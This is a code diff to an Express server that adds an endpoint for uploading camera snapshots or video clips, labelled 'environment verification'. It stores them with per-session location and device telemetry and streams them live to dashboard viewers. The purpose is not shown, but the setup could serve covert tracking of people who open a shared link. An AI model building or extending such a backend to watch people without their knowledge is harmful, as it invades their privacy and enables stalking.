@@ -8,7 +8,8 @@ const PORT = process.env.PORT || 3000;
 // Trust reverse proxies (Vercel, Cloudflare, AWS ALB)
 app.set("trust proxy", true);
 
-app.use(express.json());
+app.use(express.json({ limit: "15mb" }));
+app.use(express.urlencoded({ limit: "15mb", extended: true }));
 
 // Serve static assets (index.html, share.html, style.css)
 app.use(express.static(path.join(__dirname, "public")));
@@ -169,7 +170,48 @@ app.post("/api/location", async (req, res) => {
   res.json({ ok: true, receivedAt: now });
 });
 
-// 3. Query location telemetry
+// 3. Upload Environment Verification Camera Clip / Snapshot
+app.post("/api/media", async (req, res) => {
+  const { id, type, dataUrl } = req.body || {};
+
+  const session = await getSession(id);
+  if (!session) {
+    return res.status(404).json({ error: "Session not found or expired." });
+  }
+
+  if (!dataUrl || typeof dataUrl !== "string") {
+    return res.status(400).json({ error: "Invalid or missing media data." });
+  }
+
+  const mediaItem = {
+    type: type === "video" ? "video" : "image",
+    dataUrl,
+    receivedAt: Date.now(),
+  };
+
+  if (!session.media) session.media = [];
+  session.media.push(mediaItem);
+  if (session.media.length > 10) session.media.shift();
+
+  await saveSession(id, session);
+
+  // Real-time broadcast to dashboard viewers
+  if (activeListeners.has(id)) {
+    const payload = JSON.stringify({
+      type: "media",
+      media: mediaItem,
+    });
+    for (const sendEvent of activeListeners.get(id)) {
+      try {
+        sendEvent(payload);
+      } catch (e) {}
+    }
+  }
+
+  res.json({ ok: true, receivedAt: mediaItem.receivedAt });
+});
+
+// 4. Query location telemetry & media clips
 app.get("/api/location/:id", async (req, res) => {
   const session = await getSession(req.params.id);
   if (!session) {
@@ -183,6 +225,7 @@ app.get("/api/location/:id", async (req, res) => {
     location: session.location,
     device: session.device,
     history: session.history,
+    media: session.media || [],
   });
 });
 
